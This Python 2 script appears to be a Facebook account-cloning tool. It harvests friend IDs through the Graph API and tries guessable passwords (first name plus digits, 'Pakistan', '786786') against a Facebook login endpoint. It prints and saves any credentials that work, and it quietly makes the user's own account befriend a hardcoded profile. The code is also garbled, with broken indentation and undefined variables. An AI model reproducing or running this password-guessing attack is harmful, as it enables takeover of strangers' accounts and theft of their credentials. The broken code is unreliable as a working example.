#!/usr/bin/python2 

#coding=utf-8

#The real credit for this code goes to hiyaa creation

#Success is achieved through hard work, may Allah bless me ...

#gathered by 2022

try:

      import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess  

      from multiprocessing.pool import ThreadPool

      from requests.exceptions import ConnectionError

except ImportError:

    os.system("pip install requests python2")

 user_agent=["Mozilla/5.0 (Linux; Android 10; CPH2179) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36"]  

 

 

 

 

 def keluar():

	print "\x1b[1;91mExit"	os.sys.exit()

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!'+w[random.randint(0,len(w)-1)]+i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))

    x += '\033[0m'

    x = x.replace('!0','\033[0m')

    sys.stdout.write(x+'\n')

def jalan(z):

	for e in z + '\n':

		sys.stdout.write(e)

		sys.stdout.flush()

		time.sleep(0.0001)

#C6H12o6#

logo=''''''

\033[1;92m___====-_  _-====___

\033[1;92m          _--^^^#####//      \\#####^^^--_

\033[1;92m       _-^##########// (    ) \\##########^-_

\033[1;92m       -############//  |\^^/|  \\############-

\033[1;92m     _/############//   (@::@)   \\############\_

\033[1;92m    /#############((     \\//     ))#############\

\033[1;92m   -###############\\    (oo)    //###############-

\033[1;92m  -#################\\  / VV \  //#################-

\033[1;92m -###################\\/      \//###################-

\033[1;92_#/|##########/\######(   /\   )######/\##########|\#_

\033[1;92m|/ |#/\#/\#/\/  \#/\##\  |  |  /##/\#/  \/\#/\#/\#| \|

\033[1;92m`  |/  V  V  `   V  \#\| |  | |/#/  V   '  V  V  \|  '

\033[1;92m   `   `  `      `   / | |  | | \   '      '  '   '

\033[1;92m                    (  | |  | |  )

\033[1;92m                   __\ | |  | | /__

\033[1;92m                  (vvv(VVV)(VVV)vvv)

\033[1;97mH I Y A A  ™T H E A U T H O R

\033[1;94m▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒HIYAA▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

\033[1;95m88  88 88 Yb  dP    db       db    

\033[1;95m88  88 88  YbdP    dPYb     dPYb   

\033[1;95m888888 88   8P    dP__Yb   dP__Yb  

\033[1;95m88  88 88  dP    dP""""Yb dP""""Yb 

''''''    

def tik():

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\x1b[1;95mPlease Wait a while \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)

back = 0

berhasil = []

cekpoint = []

oks = []

id = []

listgrup = []

vulnot = "\033[31mNot Vuln"

vuln = "\033[32mVuln"

os.system("clear")

CorrectUsername = "Hiyaa"

CorrectPassword = "Hiyaa"

loop = 'true'

while (loop == 'true'):

    username = raw_input("\033[1;96m[Key] \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")

    if (username == CorrectUsername):

    	password = raw_input("\033[1;916m[Key] \x1b[1;95mTool Password \x1b[1;91m»» \x1b[1;91m")

        if (password == CorrectPassword):

            print "Logged in successfully as " + username #H86aa

	    time.sleep(2)

            loop = 'false'

def login():

	os.system('clear')

	try:

		toket = open('login.txt','r')

		menu() 

	except (KeyError,IOError):

		os.system('clear')

print('	' )

		id = raw_input('\033[1;94m[--] \x1b[1;91mID/Email: \x1b[1;95m')

		pwd = raw_input('\033[1;94m[--] \x1b[1;91mPassword: \x1b[1;95m')

		tik()

		try:

			br.open('https://m.facebook.com')

		except mechanize.URLError:

			print"\n\x1b[1;95mThere is no internet connection"

			keluar()

		br._factory.is_html = True

		br.select_form(nr=0)

		br.form['email'] = id

		br.form['pass'] = pwd

		br.submit()

		url = br.geturl()

		if 'save-device' in url:

			try:

				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'

				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}

				x=hashlib.new("md5")

				x.update(sig)

				a=x.hexdigest()

				data.update({'sig':a})

				url = "https://api.facebook.com/restserver.php"

				r=requests.get(url,params=data)

				z=json.loads(r.text)

				unikers = open("login.txt", 'w')

				unikers.write(z['access_token'])

				unikers.close()

				print '\n\x1b[1;95mLogin Successful.•◈•..'

				os.system('xdg-open https://m.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')

				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])

				menu()

			except requests.exceptions.ConnectionError:

				print"\n\x1b[1;95mThere is no internet connection"

				keluar()

		if 'checkpoint' in url:

			print("\n\x1b[1;95mYour Account is on Checkpoint")

			os.system('rm -rf login.txt')

			time.sleep(1)

			keluar()

		else:

			print("\n\x1b[1;95mPassword/Email is wrong")

			os.system('rm -rf login.txt')

			time.sleep(1)

			login()

def menu():

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		os.system('clear')

		print"\x1b[1;91mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)

		a = json.loads(otw.text)

		nama = a['name']

		id = a['id']

	except KeyError:

		os.system('clear')

		print"\033[1;95mYour Account is on Checkpoint"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	except requests.exceptions.ConnectionError:

		print"\x1b[1;95mThere is no internet connection"

		keluar()

	os.system("clear") #hiyaa

	print logo

	print "  \033[1;95m------\033[1;92mLogged in User Info\033[1;95m-----------"

	print "	   \033[1;94m Name:\033[1;93m"+nama+"\033[1;95m               "

	print "	   \033[1;94m ID:\033[1;95m"+id+"\x1b[1;95m              "

	print "\033[1;96m[------------------+\033[1;96mTechQaiser\033[1;95m+--------------------]"

	print "\033[1;95m> \033[1;93m1.\x1b[1;96mStart Cloning..."

	print "\033[1;95m> \033[1;93m0.\033[1;92mlogout            "

	pilih()

def pilih():

	unikers = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")

	if unikers =="":

		print "\x1b[1;91mFill in correctly"

		pilih()

	elif unikers =="1":

		super()

	elif unikers =="0":

		jalan('Token Removed')

		os.system('rm -rf login.txt')

		keluar()

	else:

		print "\x1b[1;91mFill in correctly"

		pilih()

def super():

	global toket

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		print"\x1b[1;94mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	os.system('clear')

	print logo

	print "\033[1;92m> \033[1;93m1.\x1b[1;95mClone From Friend List."

	print "\033[1;92m> \033[1;93m2.\x1b[1;95mClone Friend List Public ID."

	print "\033[1;92m> \033[1;93m0.\033[1;91mBack"

	pilih_super()

def pilih_super():

	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")

	if peak =="":

		print "\x1b[1;91mFill in correctly"

		pilih_super()

	elif peak =="1":

		os.system('clear')

		print logo

		print "\033[1;92m•◈•---------------------•◈•\033[1;96mBlackMafia\033[1;92m•◈•-------------------- •◈•"

		jalan('\033[1;93mGetting IDs \033[1;91m...')

		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)

		z = json.loads(r.text)

		for s in z['data']:

			id.append(s['id'])

	elif peak =="2":

		os.system('clear')

		print logo

		idt = raw_input("\033[1;93m[•-•] \033[1;94mEnter ID\033[1;93m: \033[1;95m")

		print "\033[1;94m•◈•----------------•◈•\033[1;95mHiyaa\033[1;93m•◈•-------------------•◈•"

		try:

			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)

			op = json.loads(jok.text)

			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]

		except KeyError:

			print"\x1b[1;91mID Not Found!"

			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")

			super()

		print"\033[1;94mGetting IDs wait a while\033[1;97m..."

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)

		z = json.loads(r.text)

		for i in z['data']:

			id.append(i['id'])

	elif peak =="0":

		menu()

	else:

		print "\x1b[1;91mFill in correctly"

		pilih_super()

	

	print "\033[1;94mTotal IDs\033[1;93m: \033[1;95m"+str(len(id))

	jalan('\033[1;95mPlease Wait\033[1;93m...')

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\033[1;94mCloning🍵☕\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.00001)

	print "\n\033[1;97m__________\x1b[1;95m-->Stop Process Press CTRL+Z<-----\033[1;97m-------"

	print "\033[1;97m-----------------\033[1;93mHiyaa\033[1;97m-----------------------"

	jalan(' \033[1;97m-----------------\033[1;94mCloning Start..wait a while ☕\033[1;97m--------- ')

	print "\033[1;97m-------------------\033[1;96mEnjoy a tea Time To Clone 🍵☕\033[1;97m---------------------------"

	

			

	def main(arg):

		global oks

		user = arg

		try:

			os.mkdir('out')

		except OSError:

			pass #hiyaa

		try:													

			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												

			b = json.loads(a.text)												

			pass1 = b['first_name'] + '1234'												

			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			q = json.load(data)												

			if 'access_token' in q:

				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				z = json.loads(x.text)

				print '\x1b[1;95m[  ✓  ] \x1b[1;96mHacked Done'											

				print '\x1b[1;91m[-->] \x1b[1;96mName \x1b[1;97m    : \x1b[1;91m' + b['name']											

				print '\x1b[1;91m[-->] \x1b[1;96mID \x1b[1;97m      : \x1b[1;91m' + user											

				print '\x1b[1;91m[-->] \x1b[1;96mPassword \x1b[1;97m: \x1b[1;91m' + pass1 + '\n'											

				oks.append(user+pass1)

                        else:

			        if 'www.facebook.com' in q["error_msg"]:

				    print '\x1b[1;93m[ ✖ ] \x1b[1;95mCheckpoint'

				    print '\x1b[1;93m[-->] \x1b[1;94mName \x1b[1;93m    : \x1b[1;93m' + b ['name']

				    print '\x1b[1;93m[-->] \x1b[1;94mID \x1b[1;93m      : \x1b[1;93m' + user

				    print '\x1b[1;93m[-->] \x1b[1;94mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'

				    cek = open("out/super_cp.txt", "a")

				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")

				    cek.close()

				    cekpoint.append(user+pass1)

                                else:

				    pass2 = b['first_name'] + '123'										

                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			            q = json.load(data)												

			            if 'access_token' in q:	

				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				            z = json.loads(x.text)

				            print '\x1b[1;91m[  ✓  ] \x1b[1;96mHack Done '											

				            print '\x1b[1;91m[-->] \x1b[1;93mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				            print '\x1b[1;91m[-->] \x1b[1;93mID \x1b[1;91m      : \x1b[1;91m' + user								

				            print '\x1b[1;91m[-->] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											

				            oks.append(user+pass2)

                                    else:

			                   if 'www.facebook.com' in q["error_msg"]:

				               print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				               print '\x1b[1;93m[-->] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				               print '\x1b[1;93m[-->] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				               print '\x1b[1;93m[-->] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'

				               cek = open("out/super_cp.txt", "a")

				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")

				               cek.close()

				               cekpoint.append(user+pass2)								

				           else:											

					       pass3 = b['first_name']+'12'										

					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										

					       q = json.load(data)										

					       if 'access_token' in q:	

						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                       z = json.loads(x.text)

						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack Done'								

						       print '\x1b[1;91m[-->] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									

						       print '\x1b[1;91m[-->] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							

						       print '\x1b[1;91m[-->] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									

						       oks.append(user+pass3)

                                               else:

			                               if 'www.facebook.com' in q["error_msg"]:

				                           print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				                           print '\x1b[1;93m[-->] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                           print '\x1b[1;93m[-->] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                           print '\x1b[1;93m[-->] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'

				                           cek = open("out/super_cp.txt", "a")

				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")

				                           cek.close()

				                           cekpoint.append(user+pass3)									

					               else:										

						           pass4 = b['first_name'] + '1122'											

			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                   q = json.load(data)												

			                                   if 'access_token' in q:		

						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                   z = json.loads(x.text)

				                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack Done'											

				                                   print '\x1b[1;91m[-->] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                   print '\x1b[1;91m[-->] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											

				                                   print '\x1b[1;91m[-->] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											

				                                   oks.append(user+pass4)

                                                           else:

			                                           if 'www.facebook.com' in q["error_msg"]:

				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				                                       print '\x1b[1;93m[-->] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                       print '\x1b[1;93m[-->] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                       print '\x1b[1;93m[-->] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'

				                                       cek = open("out/super_cp.txt", "a")

				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")

				                                       cek.close()

				                                       cekpoint.append(user+pass4)					

					                           else:									

						                       pass5 = '786786'							

						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								

						                       q = json.load(data)								

						                       if 'access_token' in q:	

						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                               z = json.loads(x.text)

						                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack Done'						

						                               print '\x1b[1;91m[-->] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							

						                               print '\x1b[1;91m[-->] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					

						                               print '\x1b[1;91m[-->] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							

						                               oks.append(user+pass5)	

                                                                       else:

			                                                       if 'www.facebook.com' in q["error_msg"]:

				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				                                                   print '\x1b[1;93m[-->] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                   print '\x1b[1;93m[-->]  \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                   print '\x1b[1;93m[-->] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'

				                                                   cek = open("out/super_cp.txt", "a")

				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")

				                                                   cek.close()

				                                                   cekpoint.append(user+pass5)					

						                               else:								

							                           pass6 = 'Pakistan'											

			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                           q = json.load(data)												

			                                                           if 'access_token' in q:	

								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                           z = json.loads(x.text)

				                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack Done'											

				                                                           print '\x1b[1;91m[-->] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                           print '\x1b[1;91m[[-->] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									

				                                                           print '\x1b[1;91m[-->] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											

				                                                           oks.append(user+pass6)

                                                                                   else:

			                                                                   if 'www.facebook.com' in q["error_msg"]:

				                                                               print '\x1b[1;93m[-->] \x1b[1;93mCheckpoint'

				                                                               print '\x1b[1;93m[-->] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                               print '\x1b[1;93m[-->] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                               print '\x1b[1;93m[-->] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'

				                                                               cek = open("out/super_cp.txt", "a")

				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")

				                                                               cek.close()

				                                                               cekpoint.append(user+pass6)	

						                                           else:							

								                               pass7 = b['first_name']+'12345'						

								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						

								                               q = json.load(data)						

								                               if 'access_token' in q:		

				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                       z = json.loads(x.text)

									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack Done'					

									                               print '\x1b[1;91m[-->] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					

									                               print '\x1b[1;91m[-->] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				

									                               print '\x1b[1;91m[-->] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					

									                               oks.append(user+pass7)

                                                                                               else:

			                                                                               if 'www.facebook.com' in q["error_msg"]:

				                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				                                                                           print '\x1b[1;93m[-->] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                           print '\x1b[1;93m[-->] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                           print '\x1b[1;93m[-->] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'

				                                                                           cek = open("out/super_cp.txt", "a")

				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")

				                                                                           cek.close()

				                                                                           cekpoint.append(user+pass7)           					

								                                       else:						

										                           pass8 = b['last_name'] + '786'											

			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                                                   q = json.load(data)												

			                                                                                   if 'access_token' in q:		

										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                   z = json.loads(x.text)

				                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack Done'											

				                                                                                   print '\x1b[1;91m[-->] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                                                   print '\x1b[1;91m[-->]  \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										

				                                                                                   print '\x1b[1;91m[-->] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											

				                                                                                   oks.append(user+pass8)

                                                                                                           else:

			                                                                                           if 'www.facebook.com' in q["error_msg"]:

				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				                                                                                       print '\x1b[1;93m[-->] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                       print '\x1b[1;93m[-->] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                       print '\x1b[1;93m[-->] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'

				                                                                                       cek = open("out/super_cp.txt", "a")

				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")

				                                                                                       cek.close()

				                                                                                       cekpoint.append(user+pass8)   	

										                                   else:					

										                                       pass9 = b['first_name'] + '786'					

										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				

										                                       q = json.load(data)				

										                                       if 'access_token' in q:		

		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                               z = json.loads(x.text)

											                                       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack Done ✅'			

											                                       print '\x1b[1;91m[-->] \x1b[1;94mName \x1b[1;91m    : \x1b[1;91m' + b['name']			

											                                       print '\x1b[1;91m[-->] \x1b[1;94mID \x1b[1;91m      : \x1b[1;91m' + user	

											                                       print '\x1b[1;91m[-->] \x1b[1;94mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			

											                                       oks.append(user+pass9)

                                                                                                                       else:

			                                                                                                       if 'www.facebook.com' in q["error_msg"]:

				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				                                                                                                   print '\x1b[1;93m[-->] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                                   print '\x1b[1;93m[-->] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                                   print '\x1b[1;93m[-->] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'

				                                                                                                   cek = open("out/super_cp.txt", "a")

				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")

				                                                                                                   cek.close()

				                                                                                                   cekpoint.append(user+pass9)		

											                                       

																	

															

		except:

            pass

		

	p = ThreadPool()

	p.map(main, id)

	print("")

	linex()

	print("")

	print("\033[92;1m THE PROCESS HAS BEEN COMPLETED")

	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))

	print("")

	linex()

	print("")

	raw_input("\033[93;1m PRESS ENTER TO BACK ")

	menu()

    

if __name__ == '__main__':

	main()
